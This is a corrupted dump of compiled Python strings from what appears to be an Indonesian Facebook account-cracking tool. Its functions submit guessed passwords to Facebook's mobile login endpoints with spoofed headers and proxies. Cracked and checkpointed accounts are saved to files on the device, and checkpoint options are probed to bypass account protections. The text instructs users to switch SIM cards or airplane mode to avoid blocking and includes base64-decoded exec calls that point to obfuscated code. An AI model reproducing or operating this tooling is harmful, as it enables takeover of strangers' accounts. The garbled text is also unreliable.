cracktouch.<locals>.<listcomp>r?   r?   r?   r?   r?   r?   r?   r?   r?   r?   zhttps://touch.facebook.comr?   r?   r?   r?   r?   r?   r?   r?   r?   r?   r   r  r?   ?#fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7r,  r-  zGhttps://touch.facebook.com/login/device-based/validate-password/?shbl=0r|   Fr  r  r?   r?   r<   r.  r/  r0  r?   r1  r2  r4  rJ   r  r5  r6  c                 S   r?   r?   rL   r?   rL   rL   rM   r?   E  r?   r7  r8  r9  r:  r;  c                 S   r?   r?   rL   r?   rL   rL   rM   r?   O  r?   r?   r<  r=  r>  r?  r@  rA  r?   r   r   rB  rC  rD  rE  rF  rG  rH  r	  rI  rU  rL   rL   rM   ?
cracktouch  rg  ri  c                 C   s  t j?dt? dt? t? t? dt? tt?? t? dt? dt? t? t? dt? dt	? d?
tttt?? ?? t? d??f t j??  t?t?}t?t?}t?? }|D ?]1}?z|j?ddd	d
|dddddd?
? |?d|  d ?}t?dt|j???d?t?dt|j???d?| dd|d?}d?dd? |j?? ?? D ??}|d7 }i dd?dd?dd ?d!d	?d"d#?d$d
?d%d&?d'd(?d)|?d*d?d+d,?d-d?d.d?d/d?d0d|  d ?d1d2?d3d4?d5d6i?}	|jd7|d8|i|	d9t d:?}
d;|
j?? ?!? v ?rGd<t"v ?rt#?$| d= | ? t%| |? n?d<t&v ?rAt'd>? d?| ? d@|? ?}t(|dAdB?}t)t(|dCdD?? t*dEt+ dF??| d= | d> ? t#?$| d= | ? |d7 }nW qMW  ?n9dG|j?? ?!? v ?rkd)dHi}dIt,v ?r?|
j?? }d?dJd? |j?? ?? D ??}t*dKt- dF??| d= | d= | d> ? t'd>? d?| ? dL|? dM|? ?}t(|dNdB?}t)t(|dOdD?? td7 aW  n?d<t,v ?rj|
j?? }d?dPd? |j?? ?? D ??}t*dKt- dF??| d= | d= | d> ? | }dQ}t?? }|jdR||dS?j}|jdT||dS?j}|dU7 }t?.dVt|??}d}|D ]}|dW|? d|dX ? dY|d ? dZ?7 }|d7 }?q?dX}|d[7 }t?.dVt|??}dX}|D ]}|d7 }|d\|? d|dX ? dY|d ? d]?7 }?q)t'd>? d^| ? dL|? dM|? d_|? ?}t(|dNdB?}t)t(|d`dD?? td7 aW  nnW qMW qM tj/j0?y   t1?2da? Y qMw td7 ad S )bNu    [●] r?   r;   r?   r?   r?   r*  r?   r?   rh   r?   r?   r?   r?   r?   r?   z=https://mbasic.facebook.com/login/device-based/password/?uid=r+  r?   r   r?   z.https://mbasic.facebook.com/login/save-device/r?   r?   r?   c                 S   r?   r?   rL   r?   rL   rL   rM   r?   ~  r?   zcrackmbasic.<locals>.<listcomp>r?   r?   r?   r?   r?   r?   r?   r?   r?   r?   ?https://mbasic.facebook.comr?   r?   r?   r?   r?   r?   r?   r?   r?   r?   r   r  r?   rh  r,  r-  zHhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0r|   Fr  r  r?   r?   r<   r.  r/  r0  r?   r1  r2  r4  rJ   r  r5  r6  c                 S   r?   r?   rL   r?   rL   rL   rM   r?   ?  r?   r7  r8  r9  r:  ?OKc                 S   r?   r?   rL   r?   rL   rL   rM   r?   ?  r?   r?   r<  r=  r>  r?  r@  rA  r   r   rB  rC  rD  rE  rF  rG  rH  r	  )3rY   r
  rH   r+   r  r?   r^   r#   r  r(   r  r  r  r?   r  r@   r  rB   r  r?   r  rC   rE   r?   rG   rD   r?   rU   r~   r  r  r  r   r  rO  r  rA   rP  rQ  r   rR  rS  r=   r  rT  r  rF   r?   r?   rV   rW   )r?   r?   rI   r  r  r  r?   r!  r"  r#  r$  rW  rX  r%  rY  r&  r'  rZ  r[  r\  r]  r^  r_  r`  ra  rb  rc  rd  re  rL   rL   rM   r?   r  s?   p



":z

 


(

($(? ?!?r?   c                 C   s?  d}ddddd|ddd	d
dddddd?}t ?? }z?|?d?}t|jd| |dd?|dd?jd?}|?d?}i }g d?}	|d?D ]}
|
?d?|	v rT|?|
?d?|
?d?i? q>t|jdt|d ? ||d?jd?}t	dt
| |tf ? tdt d ??| d! | d" ? td#7 a|?d$?}t|?d%kr?t	d&ttf ? W d S |D ]}t	d't|jtf ? q?W d S  ty? } z-t	dt
| |tf ? t	d(ttf ? tdt d ??| d! | d" ? td#7 aW Y d }~d S d }~ww ))Nz?Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]r*  r?   rh   rj  r?   ?|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9?mark.via.gpr?   ?navigater?   ?document?:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8?gzip, deflater?   ?r?   r?   r?   r?   r?   r?   r?   r?   r?   r?   zsec-fetch-userr?   r?   r   r?   ?%https://mbasic.facebook.com/login.phpr?   ??emailr?   rw   T?r?   r?   r  ?html.parser?form?Znhr?   Zfb_dtsgzsubmit[Continue]Zcheckpoint_datar?   r[   r?   ?action?r?   r?   ?%s++++ %s|%s ----> CP       %sr  rJ   r?   r<   r   ?optionr   ?2%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)?%s---> %s%sz>%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s)rB   r  rC   ?sopr  rD   ?findr  rG   r   rM  r?   r=   r  rH   r%  ?find_allr?   rN  rL  r?   rJ  )r?   r  rI   ?headr  ?hi?ho?jor?   ?lion?anj?kent?opsi?opsii?crL   rL   rM   rP  ?  s<   $
"
?$ 
? ??rP  c                  C   s$  t t?} d|  }tt|dd?? ttd t d t d ? d}t? ?t	|dd	?? d
}tD ?]Q}?z/z|?
d?d
 |?
d?d }}W n  tyd   t?d? tdt|tf ? tdttf ? Y W q.w t?ttttttg?}td||t t?|tf dd? tj??  d}t?? }	ddddd|dddddddd d!d"?}
|	?d?}t|	jd#||d$d%?|
d&d'?jd(?}d)|	j?? ? ? v ?r=zi|?!d*?}i }g d+?}|d,?D ]}|?d-?|v r?|?"|?d-?|?d.?i? q?t|	jdt#|d/ ? ||
d0?jd(?}td1t||tf ? |?$d2?}t |?d
k?rtd3ttf ? n|D ]}td4t|jtf ? ?qW n6   td1t||tf ? td5ttf ? Y nd6|	j?? ? ? v ?rRtd7t||tf ? n
td8t||tf ? |d7 }W q. tj%j&?y?   td9? d:}t? ?t	|d;d	?? t'?  Y q.w d<}t? ?t	|dd	?? t'?  d S )=NzWTerdapat %s Akun Untuk Dicek
Sebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih DahuluzCEK OPSIr2  r?   r?   z] Mulaiz# PROSES CEK OPSI DIMULAIr:  r?   r   r?   r   rP   z%s++++ %s ----> Error      %sz2%s---> Pemisah Tidak Didukung Untuk Program Ini%sz%s---> %s/%s ---> { %s }%sr   )?endz{Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36r*  r?   rh   rj  r?   rl  rm  r?   rn  r?   ro  rp  rq  r?   rr  rs  r?   rt  Trv  rw  r  rx  ry  r?   r[   r?   rz  r{  r|  r}  r~  r  z#%s---> Tidak Dapat Mengecek Opsi%sr  z%s++++ %s|%s ----> OK       %sz"%s++++ %s|%s ----> SALAH       %sr?   z# BAD INTERNET NETWORKr0  z# DONE)(r?   r  rS  rR  r?   r?   r?   r?   r   r?   r?   ?
IndexErrorrV   rW   rM  rJ  r?   r  rK  rL  rN  rY   r
  r  rB   r  rC   r?  r  rD   r~   r  r  r?  r  rG   r?  r?   r?   rZ   )r?  r?   r`  ZloveZkesr^   r  rV  rI   r  ?headerr?  r?  r?  r?   r?  r?  r?  r?  r?  ZliZdahrL   rL   rM   ?cek_opsi?  sr   
"
?($
"
?$
?
?
r?  rQ   ztouch .prox.txtz/sdcard/4MBF-DATA/CPz/sdcard/4MBF-DATA/OKz/sdcard/4MBF-DATA/DUMP)?rB   Zbs4r?   rR   rY   r?   ?datetimerV   rE   ?urllib3Zrich?ImportErrorrX   rW   rZ   Z
rich.tabler   ?meZrich.consoler   r?   r   r?  Zconcurrent.futuresr   r?   r   ZgpZ
rich.panelr   rR  ?base64?exec?	b64decodeZrich.markdownr	   r?   Zrich.columnsr
   ?colr   Zrprintr   Z	rich.textr   ZtekzZinstall?CONr  r@   r`   r  r  rQ  rC   rD   r  r=   rH   r?   r?   r>   r?   r?   ZxdrJ   ?	randrangerM  r?  ?d?f?gr?   ?i?jrK  rN   rA   rK   r  ?lZuaku2r?   Zuakr^   r?   r  r  r%  r  rO  r?   Z	lisensikurT  r   r?   Zlisensikunir?   r?   r\   rb   ?mkdir?dtr?   r?   r?   r+   r(   r#   r&   r   r0   r*   r)   r5   ?mrN  rJ  rL  r?   ZdicZdic2?now?dayZtglrG   ?monthZbln?yearZthnr  r  rv   rx   ry   rw   ra   r?   r?   r?   r?   r?   r?   rf  ri  r?   rP  r?  ?__name__rL   rL   rL   rM   ?<module>   s6  H

?????<
B>8
?((#*%'TSP
9
?